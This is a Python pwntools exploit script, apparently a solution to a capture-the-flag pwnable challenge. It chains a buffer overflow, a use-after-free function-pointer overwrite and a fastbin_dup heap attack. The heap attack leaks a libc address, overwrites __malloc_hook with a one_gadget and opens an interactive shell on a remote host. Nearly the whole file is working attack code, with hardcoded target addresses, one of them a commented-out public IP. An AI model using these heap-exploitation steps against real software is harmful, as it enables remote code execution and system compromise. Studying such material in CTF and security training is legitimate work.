from pwn import *

context.log_level = 'debug'

def _input(data):
    r.recvuntil('Input: ')
    r.sendline(data)

def _idx(idx):
	r.recvuntil('idx: ')
	r.sendline(str(idx))

def _size(size):
	r.recvuntil('size: ')
	r.sendline(str(size))

def _data(data):
	r.recvuntil('data: ')
	r.send(data)

def _gazuaaa(n):
	r.recvuntil('gazuaaa?? ')
	r.sendline(str(n))

def _alloc(idx, size, data=''):
	_input(str(2))
	_idx(idx)
	_size(size)
	_data(data) if data else ''

def _free(idx, n=0):
	_input(str(3))
	_idx(idx)
	_gazuaaa(n)

def _show(idx):
	_input(str(1))
	_idx(idx)
	return r.recv(6)

#r = remote('222.110.147.52',1009)
e = ELF('./a'); r = remote('172.17.0.2', 6222)
#e = ELF('./R00T_SCHool'); r = remote('localhost',6221)
if 'level3' not in e.sym:
	e.sym.level3 = 0x400AB2
libc = ELF('./libc.so.6')

# LEVEL 1 (BOF)
_input('A' * 0x10)

# LEVEL 2 (UAF)
_input(str(2))						# free
_input(str(1))						# alloc
_input('B' * 0x10 + p64(e.sym.level3))# modify
_input(str(3))						# use

# LEVEL3 (fastbin_dup)
_alloc(0, 0x80, 'C')
_alloc(1, 0x80, 'D')
_free(0)
leak = u64(_show(0).ljust(8, '\0'))
libc.address = leak - 0x3c4b78
log.success(hex(libc.address))
oneshot = libc.address + 0x4526a

_alloc(0, 0x60, 'E')
_alloc(1, 0x60, 'F')

_free(0)
_free(1)
_free(0)

_alloc(0, 0x60, p64(libc.sym.__malloc_hook - 0x23))
_alloc(0, 0x60, 'G')
_alloc(0, 0x60, 'H')
_alloc(0, 0x60, 'I' * 0x13 + p64(oneshot))
_alloc(0, 0)

r.interactive()
